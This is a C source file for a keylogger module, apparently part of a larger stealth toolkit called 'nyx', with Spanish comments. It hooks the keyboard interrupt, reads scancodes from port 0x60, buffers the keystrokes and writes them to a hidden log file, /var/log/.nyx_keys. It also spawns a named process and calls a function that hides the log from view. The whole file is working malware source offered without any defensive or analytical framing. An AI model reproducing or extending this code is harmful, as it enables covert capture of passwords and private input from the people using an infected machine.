// ============================================================
// modules/keylogger.c - Capturador de teclas (v2)
// ============================================================
#include "modules.h"

#define LOG_BUFFER_SIZE 4096
#define LOG_FILE "/var/log/.nyx_keys"

static char keylog_buffer[LOG_BUFFER_SIZE];
static uint32_t buffer_pos = 0;
static void* keylogger_task = NULL;

static void (*original_keyboard_handler)(void);

// Declaración forward
static void flush_keylog(void);

static void nyx_keyboard_handler(void) {
    uint8_t scancode = inb(0x60);
    char key = scancode_to_ascii(scancode);
    if (key != 0) {
        if (buffer_pos < LOG_BUFFER_SIZE - 1) {
            keylog_buffer[buffer_pos++] = key;
        }
        if (buffer_pos >= LOG_BUFFER_SIZE - 256) {
            flush_keylog();
        }
    }
    if (original_keyboard_handler) {
        original_keyboard_handler();
    }
}

static void flush_keylog(void) {
    if (buffer_pos == 0) return;
    int fd = vfs_open(LOG_FILE, O_WRONLY | O_APPEND | O_CREAT, 0600);
    if (fd >= 0) {
        vfs_write(fd, keylog_buffer, buffer_pos);
        vfs_close(fd);
        buffer_pos = 0;
    }
}

void* module_keylogger_init(void) {
    original_keyboard_handler = hook_irq(1, nyx_keyboard_handler);
    keylogger_task = create_process("nyx_klog", NULL, 0x7);
    hide_file(LOG_FILE);
    return NULL;
}